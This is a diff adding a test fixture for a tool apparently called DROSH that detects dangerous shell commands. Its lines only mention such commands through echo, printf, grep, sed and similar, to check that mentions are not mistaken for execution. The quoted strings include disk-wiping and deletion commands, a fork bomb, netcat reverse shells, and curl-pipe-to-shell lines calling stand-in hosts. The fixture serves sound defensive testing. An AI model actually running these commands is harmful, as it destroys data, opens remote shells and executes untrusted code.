@@ -1,0 +1,460 @@
+# DROSH mention-only dangerous-command detection fixture
+# Each line is a safe text, search, documentation, or inspection command.
+# Dangerous-looking payloads are never passed to a shell for execution.
+# Unicode and Android paths are included for normalization testing.
+echo rm -rf /
+echo rm -rf /var/lib/docker
+echo rm -rf ~/storage/shared/DCIM
+echo rm -rf /sdcard/Download
+echo rm -rf /storage/emulated/0/DCIM
+echo rm -rf /data/data/dev.drosh
+echo sudo rm -rf /
+echo sudo rm -rf /var/cache/app
+echo dd if=/dev/zero of=/dev/sda
+echo dd if=/dev/random of=/dev/mmcblk0
+echo dd if=/dev/zero of=/sdcard/test.img
+echo mkfs.ext4 /dev/sda1
+echo mkfs.xfs /dev/mapper/root
+echo mkfs.vfat /dev/block/mmcblk1p1
+echo chmod 777 /etc/shadow
+echo chmod 777 /data/data/dev.drosh
+echo chmod 777 /sdcard
+echo shutdown -h now
+echo shutdown -r now
+echo reboot
+echo reboot -f
+echo kill -9 -1
+echo git reset --hard HEAD~5
+echo git reset --hard origin/main
+echo docker system prune -a
+echo docker container prune
+echo nc -e /bin/sh 10.0.0.1 4444
+echo nc 10.0.0.1 4444 -e /bin/bash
+echo base64 -d payload.b64
+echo chown -R root:root /var/lib/app
+echo chown -R u0_a123:u0_a123 /data/data/dev.drosh
+echo apt-get purge openssh-server
+echo fdisk /dev/sda
+echo fdisk /dev/block/mmcblk0
+echo shred -n 3 /dev/sda
+echo shred -u ~/İndirilenler/günlük.log
+echo history -c
+echo pm uninstall com.example.demo
+echo adb shell pm uninstall com.example.demo
+echo adb shell rm -rf /sdcard/Test
+echo termux-open /sdcard/README.md
+echo rm -rf ~/İndirilenler
+echo rm -rf ~/storage/shared/Documents
+echo dd if=/dev/zero of=/tmp/disk.img
+echo mkfs.ext4 /dev/loop0
+echo chmod 777 ~/storage/shared/şifre.txt
+echo shutdown -h +5
+echo 'rm -rf /'
+printf "%s\n" 'rm -rf /'
+echo 'rm -rf /var/lib/docker'
+printf "%s\n" 'rm -rf /var/lib/docker'
+echo 'rm -rf ~/storage/shared/DCIM'
+printf "%s\n" 'rm -rf ~/storage/shared/DCIM'
+echo 'rm -rf /sdcard/Download'
+printf "%s\n" 'rm -rf /sdcard/Download'
+echo 'rm -rf /storage/emulated/0/DCIM'
+printf "%s\n" 'rm -rf /storage/emulated/0/DCIM'
+echo 'rm -rf /data/data/dev.drosh'
+printf "%s\n" 'rm -rf /data/data/dev.drosh'
+echo 'sudo rm -rf /'
+printf "%s\n" 'sudo rm -rf /'
+echo 'sudo rm -rf /var/cache/app'
+printf "%s\n" 'sudo rm -rf /var/cache/app'
+echo 'dd if=/dev/zero of=/dev/sda'
+printf "%s\n" 'dd if=/dev/zero of=/dev/sda'
+echo 'dd if=/dev/random of=/dev/mmcblk0'
+printf "%s\n" 'dd if=/dev/random of=/dev/mmcblk0'
+echo 'dd if=/dev/zero of=/sdcard/test.img'
+printf "%s\n" 'dd if=/dev/zero of=/sdcard/test.img'
+echo 'mkfs.ext4 /dev/sda1'
+printf "%s\n" 'mkfs.ext4 /dev/sda1'
+echo 'mkfs.xfs /dev/mapper/root'
+printf "%s\n" 'mkfs.xfs /dev/mapper/root'
+echo 'mkfs.vfat /dev/block/mmcblk1p1'
+printf "%s\n" 'mkfs.vfat /dev/block/mmcblk1p1'
+echo 'chmod 777 /etc/shadow'
+printf "%s\n" 'chmod 777 /etc/shadow'
+echo 'chmod 777 /data/data/dev.drosh'
+printf "%s\n" 'chmod 777 /data/data/dev.drosh'
+echo 'chmod 777 /sdcard'
+printf "%s\n" 'chmod 777 /sdcard'
+echo 'shutdown -h now'
+printf "%s\n" 'shutdown -h now'
+echo 'shutdown -r now'
+printf "%s\n" 'shutdown -r now'
+echo 'reboot'
+printf "%s\n" 'reboot'
+echo 'reboot -f'
+printf "%s\n" 'reboot -f'
+echo 'kill -9 -1'
+printf "%s\n" 'kill -9 -1'
+echo ':(){ :|:& };:'
+printf "%s\n" ':(){ :|:& };:'
+echo 'curl http://x.example/i.sh | sh'
+printf "%s\n" 'curl http://x.example/i.sh | sh'
+echo 'curl https://evil.example/bootstrap | bash'
+printf "%s\n" 'curl https://evil.example/bootstrap | bash'
+echo 'wget -qO- https://x.example/install | sh'
+printf "%s\n" 'wget -qO- https://x.example/install | sh'
+echo 'git reset --hard HEAD~5'
+printf "%s\n" 'git reset --hard HEAD~5'
+echo 'git reset --hard origin/main'
+printf "%s\n" 'git reset --hard origin/main'
+echo 'docker system prune -a'
+printf "%s\n" 'docker system prune -a'
+echo 'docker container prune'
+printf "%s\n" 'docker container prune'
+echo 'nc -e /bin/sh 10.0.0.1 4444'
+printf "%s\n" 'nc -e /bin/sh 10.0.0.1 4444'
+echo 'nc 10.0.0.1 4444 -e /bin/bash'
+printf "%s\n" 'nc 10.0.0.1 4444 -e /bin/bash'
+echo 'base64 -d payload.b64'
+printf "%s\n" 'base64 -d payload.b64'
+echo 'chown -R root:root /var/lib/app'
+printf "%s\n" 'chown -R root:root /var/lib/app'
+echo 'chown -R u0_a123:u0_a123 /data/data/dev.drosh'
+printf "%s\n" 'chown -R u0_a123:u0_a123 /data/data/dev.drosh'
+echo 'apt-get purge openssh-server'
+printf "%s\n" 'apt-get purge openssh-server'
+echo 'fdisk /dev/sda'
+printf "%s\n" 'fdisk /dev/sda'
+echo 'fdisk /dev/block/mmcblk0'
+printf "%s\n" 'fdisk /dev/block/mmcblk0'
+echo 'shred -n 3 /dev/sda'
+printf "%s\n" 'shred -n 3 /dev/sda'
+echo 'shred -u ~/İndirilenler/günlük.log'
+printf "%s\n" 'shred -u ~/İndirilenler/günlük.log'
+echo 'history -c'
+printf "%s\n" 'history -c'
+echo 'pm uninstall com.example.demo'
+printf "%s\n" 'pm uninstall com.example.demo'
+echo 'adb shell pm uninstall com.example.demo'
+printf "%s\n" 'adb shell pm uninstall com.example.demo'
+echo 'adb shell rm -rf /sdcard/Test'
+printf "%s\n" 'adb shell rm -rf /sdcard/Test'
+echo 'termux-open /sdcard/README.md'
+printf "%s\n" 'termux-open /sdcard/README.md'
+echo 'rm -rf ~/İndirilenler'
+printf "%s\n" 'rm -rf ~/İndirilenler'
+echo 'rm -rf ~/storage/shared/Documents'
+printf "%s\n" 'rm -rf ~/storage/shared/Documents'
+echo 'dd if=/dev/zero of=/tmp/disk.img'
+printf "%s\n" 'dd if=/dev/zero of=/tmp/disk.img'
+echo 'mkfs.ext4 /dev/loop0'
+printf "%s\n" 'mkfs.ext4 /dev/loop0'
+echo 'chmod 777 ~/storage/shared/şifre.txt'
+printf "%s\n" 'chmod 777 ~/storage/shared/şifre.txt'
+echo 'shutdown -h +5'
+printf "%s\n" 'shutdown -h +5'
+grep -rn 'rm -rf' .
+grep -rn -- 'rm -rf' docs/
+rg 'rm -rf' src/
+git log --grep 'rm -rf'
+grep -rn 'dd if=' .
+grep -rn -- 'dd if=' docs/
+rg 'dd if=' src/
+git log --grep 'dd if='
+grep -rn 'mkfs' .
+grep -rn -- 'mkfs' docs/
+rg 'mkfs' src/
+git log --grep 'mkfs'
+grep -rn 'chmod 777' .
+grep -rn -- 'chmod 777' docs/
+rg 'chmod 777' src/
+git log --grep 'chmod 777'
+grep -rn 'shutdown -r' .
+grep -rn -- 'shutdown -r' docs/
+rg 'shutdown -r' src/
+git log --grep 'shutdown -r'
+grep -rn 'kill -9 -1' .
+grep -rn -- 'kill -9 -1' docs/
+rg 'kill -9 -1' src/
+git log --grep 'kill -9 -1'
+grep -rn 'fork bomb' .
+grep -rn -- 'fork bomb' docs/
+rg 'fork bomb' src/
+git log --grep 'fork bomb'
+grep -rn 'curl.*sh' .
+grep -rn -- 'curl.*sh' docs/
+rg 'curl.*sh' src/
+git log --grep 'curl.*sh'
+grep -rn 'git reset --hard' .
+grep -rn -- 'git reset --hard' docs/
+rg 'git reset --hard' src/
+git log --grep 'git reset --hard'
+grep -rn 'docker system prune' .
+grep -rn -- 'docker system prune' docs/
+rg 'docker system prune' src/
+git log --grep 'docker system prune'
+grep -rn 'nc -e' .
+grep -rn -- 'nc -e' docs/
+rg 'nc -e' src/
+git log --grep 'nc -e'
+grep -rn 'base64 -d' .
+grep -rn -- 'base64 -d' docs/
+rg 'base64 -d' src/
+git log --grep 'base64 -d'
+grep -rn 'chown -R' .
+grep -rn -- 'chown -R' docs/
+rg 'chown -R' src/
+git log --grep 'chown -R'
+grep -rn 'apt-get purge' .
+grep -rn -- 'apt-get purge' docs/
+rg 'apt-get purge' src/
+git log --grep 'apt-get purge'
+grep -rn 'fdisk' .
+grep -rn -- 'fdisk' docs/
+rg 'fdisk' src/
+git log --grep 'fdisk'
+grep -rn 'shred' .
+grep -rn -- 'shred' docs/
+rg 'shred' src/
+git log --grep 'shred'
+grep -rn 'history -c' .
+grep -rn -- 'history -c' docs/
+rg 'history -c' src/
+git log --grep 'history -c'
+grep -rn 'pm uninstall' .
+grep -rn -- 'pm uninstall' docs/
+rg 'pm uninstall' src/
+git log --grep 'pm uninstall'
+grep -rn 'adb shell' .
+grep -rn -- 'adb shell' docs/
+rg 'adb shell' src/
+git log --grep 'adb shell'
+grep -rn 'termux' .
+grep -rn -- 'termux' docs/
+rg 'termux' src/
+git log --grep 'termux'
+grep -rn '/sdcard' .
+grep -rn -- '/sdcard' docs/
+rg '/sdcard' src/
+git log --grep '/sdcard'
+grep -rn '/storage/emulated/0' .
+grep -rn -- '/storage/emulated/0' docs/
+rg '/storage/emulated/0' src/
+git log --grep '/storage/emulated/0'
+grep -rn '/data/data' .
+grep -rn -- '/data/data' docs/
+rg '/data/data' src/
+git log --grep '/data/data'
+grep -rn '~/İndirilenler' .
+grep -rn -- '~/İndirilenler' docs/
+rg '~/İndirilenler' src/
+git log --grep '~/İndirilenler'
+grep -rn 'şifre.txt' .
+grep -rn -- 'şifre.txt' docs/
+rg 'şifre.txt' src/
+git log --grep 'şifre.txt'
+grep -rn 'günlük.log' .
+grep -rn -- 'günlük.log' docs/
+rg 'günlük.log' src/
+git log --grep 'günlük.log'
+man rm
+man dd
+man mkfs
+man chmod
+man shutdown
+man reboot
+man kill
+man curl
+man nc
+man base64
+man chown
+man apt-get
+man fdisk
+man shred
+rm --help
+dd --help
+mkfs --help
+chmod --help
+shutdown --help
+reboot --help
+kill --help
+curl --help
+base64 --help
+chown --help
+apt-get --help
+fdisk --help
+shred --help
+whatis rm
+whatis dd
+whatis mkfs
+whatis chmod
+whatis shutdown
+whatis reboot
+whatis kill
+apropos 'disk copy'
+apropos 'file deletion'
+ls -la /sdcard
+ls -la /storage/emulated/0
+ls -la ~/storage/shared
+ls -la ~/İndirilenler
+ls -la ~/storage/shared/DCIM
+ls -la /data/data
+ls -ld /root
+cat /proc/meminfo
+cat /proc/cpuinfo
+journalctl -p err -n 20
+sed 's|rm -rf /|[blocked example]|g' docs/examples.txt
+git log -S 'rm -rf /' --oneline
+sed 's|rm -rf /var/lib/docker|[blocked example]|g' docs/examples.txt
+git log -S 'rm -rf /var/lib/docker' --oneline
+sed 's|rm -rf ~/storage/shared/DCIM|[blocked example]|g' docs/examples.txt
+git log -S 'rm -rf ~/storage/shared/DCIM' --oneline
+sed 's|rm -rf /sdcard/Download|[blocked example]|g' docs/examples.txt
+git log -S 'rm -rf /sdcard/Download' --oneline
+sed 's|rm -rf /storage/emulated/0/DCIM|[blocked example]|g' docs/examples.txt
+git log -S 'rm -rf /storage/emulated/0/DCIM' --oneline
+sed 's|rm -rf /data/data/dev.drosh|[blocked example]|g' docs/examples.txt
+git log -S 'rm -rf /data/data/dev.drosh' --oneline
+sed 's|sudo rm -rf /|[blocked example]|g' docs/examples.txt
+git log -S 'sudo rm -rf /' --oneline
+sed 's|sudo rm -rf /var/cache/app|[blocked example]|g' docs/examples.txt
+git log -S 'sudo rm -rf /var/cache/app' --oneline
+sed 's|dd if=/dev/zero of=/dev/sda|[blocked example]|g' docs/examples.txt
+git log -S 'dd if=/dev/zero of=/dev/sda' --oneline
+sed 's|dd if=/dev/random of=/dev/mmcblk0|[blocked example]|g' docs/examples.txt
+git log -S 'dd if=/dev/random of=/dev/mmcblk0' --oneline
+sed 's|dd if=/dev/zero of=/sdcard/test.img|[blocked example]|g' docs/examples.txt
+git log -S 'dd if=/dev/zero of=/sdcard/test.img' --oneline
+sed 's|mkfs.ext4 /dev/sda1|[blocked example]|g' docs/examples.txt
+git log -S 'mkfs.ext4 /dev/sda1' --oneline
+sed 's|mkfs.xfs /dev/mapper/root|[blocked example]|g' docs/examples.txt
+git log -S 'mkfs.xfs /dev/mapper/root' --oneline
+sed 's|mkfs.vfat /dev/block/mmcblk1p1|[blocked example]|g' docs/examples.txt
+git log -S 'mkfs.vfat /dev/block/mmcblk1p1' --oneline
+sed 's|chmod 777 /etc/shadow|[blocked example]|g' docs/examples.txt
+git log -S 'chmod 777 /etc/shadow' --oneline
+sed 's|chmod 777 /data/data/dev.drosh|[blocked example]|g' docs/examples.txt
+git log -S 'chmod 777 /data/data/dev.drosh' --oneline
+sed 's|chmod 777 /sdcard|[blocked example]|g' docs/examples.txt
+git log -S 'chmod 777 /sdcard' --oneline
+sed 's|shutdown -h now|[blocked example]|g' docs/examples.txt
+git log -S 'shutdown -h now' --oneline
+sed 's|shutdown -r now|[blocked example]|g' docs/examples.txt
+git log -S 'shutdown -r now' --oneline
+sed 's|reboot|[blocked example]|g' docs/examples.txt
+git log -S 'reboot' --oneline
+sed 's|reboot -f|[blocked example]|g' docs/examples.txt
+git log -S 'reboot -f' --oneline
+sed 's|kill -9 -1|[blocked example]|g' docs/examples.txt
+git log -S 'kill -9 -1' --oneline
+sed 's|git reset --hard HEAD~5|[blocked example]|g' docs/examples.txt
+git log -S 'git reset --hard HEAD~5' --oneline
+sed 's|git reset --hard origin/main|[blocked example]|g' docs/examples.txt
+git log -S 'git reset --hard origin/main' --oneline
+sed 's|docker system prune -a|[blocked example]|g' docs/examples.txt
+git log -S 'docker system prune -a' --oneline
+sed 's|docker container prune|[blocked example]|g' docs/examples.txt
+git log -S 'docker container prune' --oneline
+sed 's|nc -e /bin/sh 10.0.0.1 4444|[blocked example]|g' docs/examples.txt
+git log -S 'nc -e /bin/sh 10.0.0.1 4444' --oneline
+sed 's|nc 10.0.0.1 4444 -e /bin/bash|[blocked example]|g' docs/examples.txt
+git log -S 'nc 10.0.0.1 4444 -e /bin/bash' --oneline
+sed 's|base64 -d payload.b64|[blocked example]|g' docs/examples.txt
+git log -S 'base64 -d payload.b64' --oneline
+sed 's|chown -R root:root /var/lib/app|[blocked example]|g' docs/examples.txt
+git log -S 'chown -R root:root /var/lib/app' --oneline
+sed 's|chown -R u0_a123:u0_a123 /data/data/dev.drosh|[blocked example]|g' docs/examples.txt
+git log -S 'chown -R u0_a123:u0_a123 /data/data/dev.drosh' --oneline
+sed 's|apt-get purge openssh-server|[blocked example]|g' docs/examples.txt
+git log -S 'apt-get purge openssh-server' --oneline
+sed 's|fdisk /dev/sda|[blocked example]|g' docs/examples.txt
+git log -S 'fdisk /dev/sda' --oneline
+sed 's|fdisk /dev/block/mmcblk0|[blocked example]|g' docs/examples.txt
+git log -S 'fdisk /dev/block/mmcblk0' --oneline
+sed 's|shred -n 3 /dev/sda|[blocked example]|g' docs/examples.txt
+git log -S 'shred -n 3 /dev/sda' --oneline
+sed 's|shred -u ~/İndirilenler/günlük.log|[blocked example]|g' docs/examples.txt
+git log -S 'shred -u ~/İndirilenler/günlük.log' --oneline
+sed 's|history -c|[blocked example]|g' docs/examples.txt
+git log -S 'history -c' --oneline
+sed 's|pm uninstall com.example.demo|[blocked example]|g' docs/examples.txt
+git log -S 'pm uninstall com.example.demo' --oneline
+sed 's|adb shell pm uninstall com.example.demo|[blocked example]|g' docs/examples.txt
+git log -S 'adb shell pm uninstall com.example.demo' --oneline
+sed 's|adb shell rm -rf /sdcard/Test|[blocked example]|g' docs/examples.txt
+git log -S 'adb shell rm -rf /sdcard/Test' --oneline
+sed 's|termux-open /sdcard/README.md|[blocked example]|g' docs/examples.txt
+git log -S 'termux-open /sdcard/README.md' --oneline
+sed 's|rm -rf ~/İndirilenler|[blocked example]|g' docs/examples.txt
+git log -S 'rm -rf ~/İndirilenler' --oneline
+sed 's|rm -rf ~/storage/shared/Documents|[blocked example]|g' docs/examples.txt
+git log -S 'rm -rf ~/storage/shared/Documents' --oneline
+sed 's|dd if=/dev/zero of=/tmp/disk.img|[blocked example]|g' docs/examples.txt
+git log -S 'dd if=/dev/zero of=/tmp/disk.img' --oneline
+sed 's|mkfs.ext4 /dev/loop0|[blocked example]|g' docs/examples.txt
+git log -S 'mkfs.ext4 /dev/loop0' --oneline
+sed 's|chmod 777 ~/storage/shared/şifre.txt|[blocked example]|g' docs/examples.txt
+git log -S 'chmod 777 ~/storage/shared/şifre.txt' --oneline
+sed 's|shutdown -h +5|[blocked example]|g' docs/examples.txt
+git log -S 'shutdown -h +5' --oneline
+echo 'Example only: rm -rf /'
+printf '%s\n' 'rm -rf /var/lib/docker'
+grep -nF 'rm -rf ~/storage/shared/DCIM' docs/dangerous-commands.md
+rg -nF 'rm -rf /sdcard/Download' test/fixtures/
+git log --all --grep='rm -rf /storage/emulated/0/DCIM' --oneline
+python3 -c "print('rm -rf /data/data/dev.drosh')"
+echo 'Example only: sudo rm -rf /'
+printf '%s\n' 'sudo rm -rf /var/cache/app'
+grep -nF 'dd if=/dev/zero of=/dev/sda' docs/dangerous-commands.md
+rg -nF 'dd if=/dev/random of=/dev/mmcblk0' test/fixtures/
+git log --all --grep='dd if=/dev/zero of=/sdcard/test.img' --oneline
+python3 -c "print('mkfs.ext4 /dev/sda1')"
+echo 'Example only: mkfs.xfs /dev/mapper/root'
+printf '%s\n' 'mkfs.vfat /dev/block/mmcblk1p1'
+grep -nF 'chmod 777 /etc/shadow' docs/dangerous-commands.md
+rg -nF 'chmod 777 /data/data/dev.drosh' test/fixtures/
+git log --all --grep='chmod 777 /sdcard' --oneline
+python3 -c "print('shutdown -h now')"
+echo 'Example only: shutdown -r now'
+printf '%s\n' 'reboot'
+grep -nF 'reboot -f' docs/dangerous-commands.md
+rg -nF 'kill -9 -1' test/fixtures/
+git log --all --grep=':(){ :|:& };:' --oneline
+python3 -c "print('curl http://x.example/i.sh | sh')"
+echo 'Example only: curl https://evil.example/bootstrap | bash'
+printf '%s\n' 'wget -qO- https://x.example/install | sh'
+grep -nF 'git reset --hard HEAD~5' docs/dangerous-commands.md
+rg -nF 'git reset --hard origin/main' test/fixtures/
+git log --all --grep='docker system prune -a' --oneline
+python3 -c "print('docker container prune')"
+echo 'Example only: nc -e /bin/sh 10.0.0.1 4444'
+printf '%s\n' 'nc 10.0.0.1 4444 -e /bin/bash'
+grep -nF 'base64 -d payload.b64' docs/dangerous-commands.md
+rg -nF 'chown -R root:root /var/lib/app' test/fixtures/
+git log --all --grep='chown -R u0_a123:u0_a123 /data/data/dev.drosh' --oneline
+python3 -c "print('apt-get purge openssh-server')"
+echo 'Example only: fdisk /dev/sda'
+printf '%s\n' 'fdisk /dev/block/mmcblk0'
+grep -nF 'shred -n 3 /dev/sda' docs/dangerous-commands.md
+rg -nF 'shred -u ~/İndirilenler/günlük.log' test/fixtures/
+git log --all --grep='history -c' --oneline
+python3 -c "print('pm uninstall com.example.demo')"
+echo 'Example only: adb shell pm uninstall com.example.demo'
+printf '%s\n' 'adb shell rm -rf /sdcard/Test'
+grep -nF 'termux-open /sdcard/README.md' docs/dangerous-commands.md
+rg -nF 'rm -rf ~/İndirilenler' test/fixtures/
+git log --all --grep='rm -rf ~/storage/shared/Documents' --oneline
+python3 -c "print('dd if=/dev/zero of=/tmp/disk.img')"
+echo 'Example only: mkfs.ext4 /dev/loop0'
+printf '%s\n' 'chmod 777 ~/storage/shared/şifre.txt'
+grep -nF 'shutdown -h +5' docs/dangerous-commands.md
+rg -nF 'rm -rf /' test/fixtures/
+git log --all --grep='rm -rf /var/lib/docker' --oneline
+python3 -c "print('rm -rf ~/storage/shared/DCIM')"
+echo 'Example only: rm -rf /sdcard/Download'
+printf '%s\n' 'rm -rf /storage/emulated/0/DCIM'
+grep -nF 'rm -rf /data/data/dev.drosh' docs/dangerous-commands.md
+rg -nF 'sudo rm -rf /' test/fixtures/
+git log --all --grep='sudo rm -rf /var/cache/app' --oneline
+python3 -c "print('dd if=/dev/zero of=/dev/sda')"
+echo 'Example only: dd if=/dev/random of=/dev/mmcblk0'
+printf '%s\n' 'dd if=/dev/zero of=/sdcard/test.img'
+grep -nF 'mkfs.ext4 /dev/sda1' docs/dangerous-commands.md
